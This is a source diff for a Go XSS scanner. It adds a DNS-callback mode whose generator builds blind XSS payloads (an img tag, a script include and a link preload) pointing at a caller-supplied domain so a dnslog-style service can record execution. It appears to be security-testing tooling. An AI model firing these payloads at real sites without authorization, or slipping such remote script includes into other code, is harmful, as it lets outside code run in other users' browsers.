@@ -30,8 +30,9 @@ type Payload struct {
 }
 
 type Generator struct {
-	callbackURL string
-	preset      PayloadPreset
+	callbackURL    string
+	dnsDomain      string // DNS exfil domain (dnslog-style); blind payloads use <marker>.<domain>
+	preset         PayloadPreset
 	customPayloads []Payload // user-provided payloads from wordlist
 }
 
@@ -50,6 +51,12 @@ func NewGenerator() *Generator {
 
 func NewGeneratorWithCallback(callbackURL string) *Generator {
 	return &Generator{callbackURL: callbackURL, preset: PresetStandard}
+}
+
+// NewGeneratorWithDNSCallback creates a generator whose blind payloads point
+// at <marker>.<domain> subdomains (DNS exfil mode for dnslog-style platforms).
+func NewGeneratorWithDNSCallback(domain string) *Generator {
+	return &Generator{dnsDomain: domain, preset: PresetStandard}
 }
 
 func (g *Generator) SetPreset(preset PayloadPreset) {
@@ -123,6 +130,9 @@ func (g *Generator) Generate(injection model.InjectionPoint) []Payload {
 	if g.callbackURL != "" {
 		payloads = append(payloads, g.generateBlindPayloads()...)
 	}
+	if g.dnsDomain != "" {
+		payloads = append(payloads, g.generateDNSBlindPayloads()...)
+	}
 
 	// Append custom payloads from wordlist — tested only in contexts where
 	// the payload structure could actually execute. This avoids wasting
@@ -175,6 +185,45 @@ func (g *Generator) filterTemplates(templates []PayloadTemplate) []PayloadTempla
 			return templates // fallback if everything was filtered
 		}
 		return filtered
+	}
+}
+
+// generateDNSBlindPayloads builds blind payloads for DNS exfil mode: each
+// payload requests <xsscan-<rand>>.<domain>, so the dnslog-style platform
+// records a DNS query proving execution. Works even when HTTP egress is
+// blocked — only DNS resolution is needed.
+func (g *Generator) generateDNSBlindPayloads() []Payload {
+	if g.dnsDomain == "" {
+		return nil
+	}
+	// The caller (cmd) passes a run-unique subdomain prefix so each scan's
+	// DNS queries are attributable on dnslog-style platforms.
+	host := g.dnsDomain
+	return []Payload{
+		{
+			Value:    fmt.Sprintf(`<img src="http://%s/x">`, host),
+			Context:  context.ContextHTMLBody,
+			Type:     PayloadTypeBlind,
+			Score:    0.7,
+			Desc:     "DNS blind XSS via img src",
+			Severity: model.High,
+		},
+		{
+			Value:    fmt.Sprintf(`<script src="http://%s/x.js"></script>`, host),
+			Context:  context.ContextHTMLBody,
+			Type:     PayloadTypeBlind,
+			Score:    0.7,
+			Desc:     "DNS blind XSS via script include",
+			Severity: model.High,
+		},
+		{
+			Value:    fmt.Sprintf(`<link rel="preload" href="http://%s/x.css">`, host),
+			Context:  context.ContextHTMLBody,
+			Type:     PayloadTypeBlind,
+			Score:    0.6,
+			Desc:     "DNS blind XSS via link preload",
+			Severity: model.Medium,
+		},
 	}
 }
 
